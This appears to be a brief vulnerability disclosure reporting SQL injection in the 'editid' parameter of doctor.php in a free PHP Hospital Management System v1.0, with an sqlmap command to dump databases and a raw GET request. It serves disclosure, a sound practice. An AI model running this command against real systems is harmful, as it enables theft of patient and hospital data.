**[Hospital-Management-System v1.0 - SQLi](https://itsourcecode.com/free-projects/php-project/hospital-management-system-in-php-with-source-code/)**
---

[Vendor](https://itsourcecode.com/author/unguardable/)
---

![image-20220508152043091](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20220508152043091.png)

### Description:
---
The vulnerability page is ```doctor.php```

```http://your-ip/HMS/doctor.php```


Hospital-Management-System v1.0  

The ```editid``` parameter in the ```doctor.php``` page appears to be vulnerable to SQL injection attacks.

[+]sqlmap:


python sqlmap.py -u "http://your-ip/hms/doctor.php?editid=1" --random-agent  --dbs



[+]GET request package

```
GET /hms/doctor.php?editid=1 HTTP/1.1
Host: 192.168.74.136
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cpbuir6uql3t0128e61bn2ihm1
Upgrade-Insecure-Requests: 1

```
### In action:
---

![image-20220508152225728](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20220508152225728.png)

### Proof and Exploit:
---
<video src="G:\z郑州work\资料\培训\河南交通职业技术学院\录屏\example.mp4"></video>
